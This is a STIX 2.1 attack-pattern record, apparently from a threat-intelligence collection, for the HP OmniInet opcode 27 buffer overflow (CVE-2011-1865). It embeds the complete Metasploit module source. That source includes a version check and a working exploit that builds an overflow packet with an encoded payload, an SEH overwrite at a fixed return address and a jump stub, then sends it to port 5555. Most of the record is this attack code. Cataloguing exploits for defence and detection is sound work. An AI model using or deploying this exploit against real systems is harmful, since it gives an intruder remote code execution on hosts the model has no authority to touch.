{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e7bf9bc8-0700-4915-8ccf-29f7c68b4617",
    "created": "2024-08-14T16:47:27.057808Z",
    "modified": "2024-08-14T16:47:27.057811Z",
    "name": "HP OmniInet.exe Opcode 27 Buffer Overflow",
    "description": " This module exploits a buffer overflow in the Hewlett-Packard OmniInet NT Service. By sending a specially crafted opcode 27 packet a remote attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_omniinet_3.rb",
            "external_id": "hp_omniinet_3.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1865"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP OmniInet.exe Opcode 27 Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the Hewlett-Packard\n        OmniInet NT Service. By sending a specially crafted opcode 27 packet,\n        a remote attacker may be able to execute arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2011-1865' ],\n          [ 'OSVDB', '73571'],\n          [ 'URL', 'http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Payload' =>\n        {\n          'Space'    => 800,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243',\n            {\n              #POP/POP/RET from OmniBack\\bin\\MSVCR71.dll\n              'Ret' => 0x7c35630d\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-06-29'))\n\n    register_options([Opt::RPORT(5555)])\n  end\n\n  def check\n\n    connect\n    sock.put(rand_text_alpha_upper(64))\n    resp = sock.get_once(-1,5)\n    disconnect\n\n    if (resp)\n      resp = resp.unpack('v*').pack('C*')\n      print_status(\"Received response: \" + resp)\n\n      # extract version\n      if (resp =~ /HP Data Protector/)\n        version = resp.split[3]\n      elsif (resp =~ /HP OpenView Storage Data Protector/)\n        version = resp.split[5]\n      elsif (resp =~ /HP StorageWorks Application Recovery Manager/)\n        version = resp.split[5]\n      else\n        return Exploit::CheckCode::Detected\n      end\n\n      version = version.split('.')\n      major = version[1].to_i\n      minor = version[2].to_i\n      if ((major < 6) or (major == 6 and minor < 11))\n        return Exploit::CheckCode::Appears\n      end\n\n      if ((major > 6) or (major == 6 and minor >= 11))\n        return Exploit::CheckCode::Safe\n      end\n\n    end\n    return Exploit::CheckCode::Safe\n\n  end\n\n  def exploit\n\n    connect\n\n    trigger = rand_text_alpha_upper(10000)\n    trigger[4552, payload.encoded.length] = payload.encoded\n    trigger[5352, 8] = generate_seh_record(target.ret)\n    trigger[5360, 5] = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-788\").encode_string\n\n    opcode = \"27\"\n\n    packet = Rex::Text.to_unicode(\"\\x00\")\n    packet << \"\\x27\\xca\" #length\n    packet << \"\\xff\\xfe\\x32\"\n    packet << \"\\x00\\x00\\x00\"\n    packet << Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 3\n    packet << Rex::Text.to_unicode(\"\\x20\")\n    packet << trigger\n    packet << Rex::Text.to_unicode(\"\\x00\")\n    packet << Rex::Text.to_unicode(\"\\x20\\x61\\x00\")\n    packet << Rex::Text.to_unicode(\"\\x20\" + opcode + \"\\x00\")\n    packet << Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 24\n\n    print_status(\"Trying #{target.name}...\")\n    sock.put(packet)\n\n    select(nil,nil,nil,10)\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-06-29",
    "x_mitre_platforms": [
        "win'"
    ]
}